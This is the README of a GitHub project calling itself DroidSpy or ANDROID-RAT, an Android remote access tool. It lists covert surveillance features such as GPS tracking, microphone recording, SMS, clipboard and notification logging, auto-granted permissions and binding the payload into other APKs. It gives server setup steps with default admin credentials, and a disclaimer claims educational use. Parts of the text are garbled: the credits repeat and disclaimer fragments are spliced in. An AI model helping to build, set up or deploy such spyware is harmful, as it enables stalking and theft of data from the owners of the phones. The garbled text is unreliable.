<p align="center">
<img src="https://github.com/tulu9777/Dm/blob/master/assets/webpublic/logo.png" height="60"><br>
A cloud based remote android managment suite, powered by NodeJS
</p>


## Features
- GPS Logging
- Microphone Recording
- View Contacts
- SMS Logs
- Send SMS
- Call Logs
- View Installed Apps
- View Stub Permissions
- Live Clipboard Logging
- Live Notification Logging
- View WiFi Networks (logs previously seen)
- File Explorer & Downloader
- Built In APK Builder
- Auto Allow Permission
- Easy Bind Any Apk

## Prerequisites 
 - Java Runtime Environment 8
    - See [installation](#Installation) for OS specifics
 - NodeJs 
 - A Server

## Installation ON VPS & PC

1. Install JRE 8 
    - Debian, Ubuntu, Etc
        - `sudo apt-get install openjdk-8-jre`
    - Fedora, Oracle, Red Hat, etc
        -  `su -c "yum install java-1.8.0-openjdk"`
    - Windows 
        - click [HERE](https://www.oracle.com/technetwork/java/javase/downloads/jre8-downloads-2133155.html) for downloads

2. Install NodeJS [Instructions Here](https://nodejs.org/en/download/package-manager/) (If you can't figure this out, you shouldn't really be using this)

3. install PM2 
    - `npm install pm2 -g`

4. Download and Extract [HERE](https://codeload.github.com/Linuxndroid/DroidSpy/zip/master)

5. In the extracted folder, run these commands
    - `npm install` <- install dependencies
    - `pm2 start index.js` <-- start the DroidSpy
    - `pm2 startup` <- to run DroidSpy on startup

6. Default Username & Password check password.txt file
    - Username: admin
    - Password: admin
    
7. Set Username & Password Manually  
    1. Stop DroidSpy `pm2 stop index`
    2. Open `maindb.json` in a text editor
    3. under `admin` 
        - set the `username` as plain text
        - set the `password` as a LOWERCASE MD5 hash
    4. save the file
    5. run `pm2 restart all`

8. in your browser navigate to `http://<SERVER IP>:22533`
    
## Happy Hacking
## Disclaimer
<b>ANDROID-RAT Provides no warranty with this software and will not be responsible for any direct or indirect damage caused due to the usage of this tool.<br>
ANDROID-RAT is built for both Educational and Internal use ONLY.</b>

<br>
<p align="center">MADE WITH ?????? BY <a href="https://wwwwww.youtube.com/channel/UC2O1Hfg-dDCbUcau5QWGcgg">Linuxndroid</a></p>


## Credits

<b> Credits to <a href="https://github.com/D3VL">D3VL</a> for the original code base this repository is based on at <a href="https://github.com/D3VL/L3MON">L3MON</a>
3MON</a>
r indirect damage caused due to the usage of this tool.<br>
DroidSpy is built for both Educational and Internal use ONLY.</b>

<br>
<p align="center">Made with ?????? By <a href="https://www.youtube.com/channel/UC2O1Hfg-dDCbUcau5QWGcgg">Linuxndroid</a></p>


## Follow Me on :

[![Instagram](https://img.shields.io/badge/IG-linuxndroid-yellowgreen?style=for-the-badge&logo=instagram)](https://www.instagram.com/linuxndroid)

[![Youtube](https://img.shields.io/badge/Youtube-linuxndroid-redgreen?style=for-the-badge&logo=youtube)](https://www.youtube.com/channel/UC2O1Hfg-dDCbUcau5QWGcgg)

[![Browser](https://img.shields.io/badge/Website-linuxndroid-yellowred?style=for-the-badge&logo=browser)](https://www.linuxndroid.com)

## Credits

<b> Credits to <a href="https://github.com/D3VL">D3VL</a> for the original code base this repository is based on at <a href="https://github.com/D3VL/L3MON">L3MON</a>

Inspired by INFINITYHACKS (https://github.com/ExtremeHacking/infinityhacks-botnet)
